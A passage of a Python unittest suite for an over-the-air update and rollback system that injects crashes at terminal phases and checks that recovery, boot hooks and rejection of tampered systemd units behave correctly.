                            raise OSError('injected terminal window')
                        return original_record(path, value)
                    def fail_replace(path, data, mode=0o600):
                        if path.name == ('current_version.txt' if event == 'current-version' else 'applied_version.txt' if event == 'applied-version' else ''):
                            raise OSError('injected terminal window')
                        return original_replace(path, data, mode)
                    def fail_save(record):
                        if event == 'owner-final' and record['phase'] == 'OWNER_FINISHED': raise OSError('injected terminal window')
                        return original_save(record)
                    with mock.patch.object(child.m.ProductionRuntime, 'record', fail_record), \
                         mock.patch.object(child.m, 'replace', fail_replace), mock.patch.object(owner, 'save', fail_save):
                        with self.assertRaisesRegex(OSError, 'terminal window'):
                            with owner.lease(): child.m.production_ota_owner(owner, owner.read())
                    self.assertEqual(owner.read()['phase'], 'OWNER_INSTALLING')
                    self.assertFalse((child.runtime.root / 'pending.json').exists())
                    installed = (child.home / 'bin/SystemMonitor').read_bytes()
                    child.calls.clear()
                    owner.recover()
                    self.assertEqual(owner.read()['phase'], 'OWNER_FINISHED')
                    self.assertEqual(owner.read()['completionProof']['status'], 'healthy')
                    self.assertEqual((child.home / 'bin/SystemMonitor').read_bytes(), installed)
                    self.assertFalse(any(c[0] == 'stop' for c in child.calls), 'promoted runtime must not roll back')
                    owner.recover()  # same original job remains consumed
                finally:
                    child.doCleanups()

    def test_failed_rollback_completed_then_owner_final_crash_resumes_original_job(self):
        owner = self.owner_fixture()
        old_monitor = (self.home / 'bin/SystemMonitor').read_bytes()
        original_external, original_save = self.external, owner.save
        def endpoint(command, **kwargs):
            result = original_external(command, **kwargs)
            if command[0] == '/usr/bin/curl' and (self.home / 'bin/SystemMonitor').read_bytes() != old_monitor:
                return subprocess.CompletedProcess(command, 1, b'', b'candidate-only health failure')
            return result
        def fail_final(record):
            if record['phase'] == 'OWNER_FINISHED': raise OSError('injected rollback terminal crash')
            return original_save(record)
        with mock.patch.object(self.m.subprocess, 'run', endpoint), mock.patch.object(owner, 'save', fail_final):
            with self.assertRaisesRegex(OSError, 'rollback terminal'):
                with owner.lease(): self.m.production_ota_owner(owner, owner.read())
        record = owner.read()
        tx = self.runtime.root / 'transactions' / record['productionTransaction']
        self.assertEqual(self.g.production_json(tx / 'state.json')['phase'], 'RECOVERED')
        self.assertFalse((self.runtime.root / 'pending.json').exists())
        self.calls.clear()
        owner.recover()
        result = owner.read()
        self.assertEqual(result['phase'], 'OWNER_FINISHED')
        self.assertEqual((result['completionProof']['status'], result['completionProof']['rollback']), ('failed', 'succeeded'))
        self.assertEqual((self.home / 'bin/SystemMonitor').read_bytes(), old_monitor)
        self.assertFalse(any(c[0] in ('stop', 'start') for c in self.calls))

    def test_boot_hook_resolves_durable_owner_tail_even_without_runtime_pending(self):
        owner = self.owner_fixture()
        original_save = owner.save
        def fail_final(record):
            if record['phase'] == 'OWNER_FINISHED': raise OSError('injected owner terminal crash')
            return original_save(record)
        with mock.patch.object(owner, 'save', fail_final):
            with self.assertRaises(OSError):
                with owner.lease(): self.m.production_ota_owner(owner, owner.read())
        self.assertFalse((self.runtime.root / 'pending.json').exists())
        original_spec = importlib.util.spec_from_file_location
        def local_spec(name, path, *args, **kwargs):
            spec = original_spec(name, path, *args, **kwargs)
            if name == 'production_ota_health':
                delegate = spec.loader
                fixture = self
                class NamespaceLoader:
                    def create_module(self, spec): return None
                    def exec_module(self, module):
                        delegate.exec_module(module)
                        module.RuntimeHandoff.verify_owner = lambda *a, **k: dict(ActiveState='inactive', MainPID='0', Job='')
                        module.RuntimeHandoff.no_unit_tasks = lambda *a: None
                        module.RuntimeHandoff.production_entry = lambda *a: fixture.m
                spec.loader = NamespaceLoader()
            return spec
        self.calls.clear()
        original_stage = self.m.production_boot_stage_entry
        def stage(runtime, authority):
            # Capture the actual kernel flock table while the official caller holds
            # its mapped private lock; never fabricate a positive owner row.
            self.write(self.path('/proc/locks'), Path('/proc/locks').read_bytes())
            self.assertTrue(self.m.production_locked_owner({'ownerProof': self.m.production_owner_proof()}))
            return original_stage(runtime, authority)
        with mock.patch.object(self.m.importlib.util, 'spec_from_file_location', local_spec):
            with mock.patch.object(self.m, 'production_boot_stage_entry', stage):
                self.m.production_boot(types.SimpleNamespace(home=self.home))
            self.assertEqual(owner.read()['phase'], 'OWNER_INSTALLING', 'gate cannot publish untested health')
            self.assertFalse(any(c[0] in ('stop', 'start') for c in self.calls))
            self.m.production_boot_finish(types.SimpleNamespace(home=self.home))
        self.assertEqual(owner.read()['phase'], 'OWNER_FINISHED')

    def test_boot_oneshot_during_start_requires_positive_live_offline_owner(self):
        original_start = self.m.ProductionRuntime.start
        seen = []
        def start(runtime, tx, state, baseline, phase):
            # Run the actual STARTING setup/gates, then invoke the boot hook
            # against actual kernel flock rows and this private process stat.
            original_start(runtime, tx, state, baseline, phase)
            self.write(self.path('/proc/locks'), Path('/proc/locks').read_bytes())
            self.assertTrue(self.m.production_locked_owner(state))
            self.m.production_boot(types.SimpleNamespace(home=self.home))
            seen.append(state['phase'])
        with mock.patch.object(self.m.ProductionRuntime, 'start', start): self.adopt()
        self.assertEqual(seen, ['STARTING'])

    def test_dangling_production_pointer_cannot_fall_back_to_legacy_authority(self):
        self.adopt()
        pointer = self.runtime.root / 'current.json'
        pointer.unlink(); pointer.symlink_to(self.root / 'missing-record')
        with self.assertRaises(ValueError): self.g.startup(self.home)

    def test_mismatched_effective_dropin_or_fragment_denies_before_intent(self):
        original = self.property
        for property_name, value in (('FragmentPath', '/run/systemd/transient/evil.service'),
                                     ('DropInPaths', '/run/systemd/system/evil.conf'), ('NeedDaemonReload', 'yes')):
            with mock.patch.object(self.g, 'systemctl_value', lambda u, p: value if p == property_name else original(u, p)):
                with self.assertRaises(ValueError): self.adopt()
            self.assertFalse(self.runtime.root.exists())

    def test_frozen_two_board_active_allowlists_include_launcher(self):
        # Sealed evidence projections, not fresh board facts or device authority.
        fixture = json.loads((REPO / 'tools/fixtures/production-historical-r2-allowlists.json').read_text())
        for row in fixture['boards']:
            self.assertIn('gateway-services.service', row['activatedUnits'])
            self.assertEqual(row['activeAllowedUnits'], row['activatedUnits'])
            self.assertTrue(set(row['activatedUnits']) <= set(self.g.PRODUCTION_READERS) | {'gateway-services.service'})


if __name__ == '__main__':
    unittest.main()
